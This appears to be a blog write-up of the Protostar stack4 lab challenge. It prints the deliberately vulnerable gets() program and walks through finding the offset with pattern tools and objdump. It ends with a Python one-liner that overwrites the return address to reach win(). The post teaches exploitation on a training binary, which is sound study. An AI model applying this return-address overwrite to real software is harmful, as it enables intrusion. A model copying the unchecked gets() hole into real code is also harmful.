@@ -1,0 +1,64 @@
+<hr />
+
+<h2 id="introduction">Introduction</h2>
+<p><br /> Hey again ,Today’s article is going to be short. So last time I solved stack3 , I’m back again and today I’m going to solve stack4 which is really interesting , it’s slightly different from stack3 but that difference is a new thing to see if we compare it to the previous challenges. So let’s not talk too much and jump right in.
+<br /> Read my <a href="/categories">other articles about buffer overflow</a>
+<img src="/images/binary-exploitation/BOF4/0.png" alt="" /></p>
+<hr />
+
+<h2 id="stack4">./stack4</h2>
+<p><br /> Let’s take a look at the source code first :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void win()
+{
+ printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+ char buffer[64];
+
+ gets(buffer);
+}
+</code></pre></div></div>
+<p><br /> Very simple ! it defines the <code class="highlighter-rouge">win</code> function then defines the <code class="highlighter-rouge">main</code> function which sets a buffer of 64 chars and stores our input in it. But wait a second where is the variable that we’re gonna overwrite ? in the previous challenges we had a variable that is being used by a function to change the code flow , now what will we overwrite ?
+<br /> The answer is the <code class="highlighter-rouge">EIP</code> which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer.
+<code class="highlighter-rouge">python -c "print 'A' * 64"</code>
+<img src="/images/binary-exploitation/BOF4/1.png" alt="" />
+<br /> The program didn’t even crash … why ? Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars 
+<code class="highlighter-rouge">python -c "print 'A' * 100"</code>
+<img src="/images/binary-exploitation/BOF4/2.png" alt="" />
+<br /> The program crashed , Let’s find where does it exactly crash like we did in the <a href="/binary-exploitation/bof3">previous challenge</a> read it if you haven’t done yet.
+<br /> We will create a pattern with <code class="highlighter-rouge">pattern_create</code>
+<code class="highlighter-rouge">./pattern_create.rb -l 100</code>
+<img src="/images/binary-exploitation/BOF4/3.png" alt="" />
+<br /> Then we will pass it to the program in gdb 
+<img src="/images/binary-exploitation/BOF4/4.png" alt="" />
+<br /> It crashes at <code class="highlighter-rouge">0x63413563</code>
+<br /> We locate that with pattern_offset
+<code class="highlighter-rouge">./pattern_offset.rb -q 63413563</code>
+<img src="/images/binary-exploitation/BOF4/5.png" alt="" />
+<br /> We get exact match at offset 76
+<br /> Next step is to find the address of <code class="highlighter-rouge">win()</code> 
+<code class="highlighter-rouge">objdump -d</code>
+<img src="/images/binary-exploitation/BOF4/6.png" alt="" />
+<br /> The address is <code class="highlighter-rouge">0x080483f4</code>
+<br /> Now we can build our exploit : 
+<code class="highlighter-rouge">python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | ./stack4</code>
+<img src="/images/binary-exploitation/BOF4/7.png" alt="" />
+<br /> And we successfully changed the code flow !
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Binary Exploitation article : <a href="/binary-exploitation/bof3/">Buffer Overflow Examples, Overwriting a function pointer - protostar stack3</a>
+<br /> Next Binary Exploitation article : <a href="/binary-exploitation/bof5/">Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5</a></p>
+<hr />
+
